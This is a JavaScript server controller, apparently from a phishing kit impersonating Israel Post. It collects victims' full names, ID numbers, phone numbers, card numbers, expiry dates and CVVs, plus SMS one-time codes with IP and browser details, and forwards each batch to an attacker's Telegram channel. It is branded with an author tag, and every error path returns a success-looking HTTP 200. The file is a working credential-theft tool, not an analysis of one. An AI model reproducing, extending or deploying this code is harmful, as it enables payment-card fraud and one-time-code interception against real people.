const { telegramService } = require("../services");
const formatCreditCard = require("../utils/formatCreditCard");
const getUserAgent = require("../utils/getUserAgent");
const { Axios } = require("axios");

module.exports.addCardDetails = async (req, res, next) => {
  try {
    const { fullName, idNumber, phoneNumber, cardNumber, expiry, cvv } =
      req.body;

    const axios = new Axios();
    const bin = cardNumber.substring(0, 7);
    const res = await axios.get(`https://lookup.binlist.net/${bin}`);
    const cardDetails = res.data;

    const message = `
      [IsraelPost - 💳 Card Info 💳]
      [👤] Full Name: ${fullName}
      [👤] ID Number: ${idNumber}
      [👤] Mobile Number: ${phoneNumber}
      [💳] Card Number: ${formatCreditCard(cardNumber)}
      [🔄] Expiry Date: ${expiry}
      [🔑] CCV: ${cvv}
      [🔍] GEO IP: ${req.IP}
      
      [IsraelPost - 💳 Bin Info 💳]
      [🏛] Card Bank:  ${cardDetails.bank.name}
      [💳] Card Type: ${cardDetails.scheme} ${cardDetails.type}
      [💳] Card Brand: ${cardDetails.brand}
      [💳] Prepaid: ${cardDetails.prepaid ? "Yes" : "No"}
      [💳] Currency: ${cardDetails.country.currency}
      [IsraelPost BY: GHOST !#MSD!#]
      `;

    telegramService.sendMessage(message);

    res.status(200).json({ success: true });
  } catch (err) {
    res.status(200).json({ success: false });
  }
};

module.exports.addCardOTP = async (req, res, next) => {
  try {
    const { otp } = req.body;

    const { osName, browser, ua } = getUserAgent(req);

    const message = `
    [=====>  ISRAELPOST: GHOST $ MSD  SMS    <=====]
    [ SMS CODE:  ${otp}
    [ IP :    ${req.IP}
    [ OS :    ${osName}
    [ Browser :    ${browser}
    [ UA :    ${ua}
    [=====>  ISRAELPOST: GHOST $ MSD  SMS   <=====]
    `;

    telegramService.sendMessage(message);

    res.status(200).json({ success: true });
  } catch (err) {
    res.status(200).json({ success: false });
  }
};
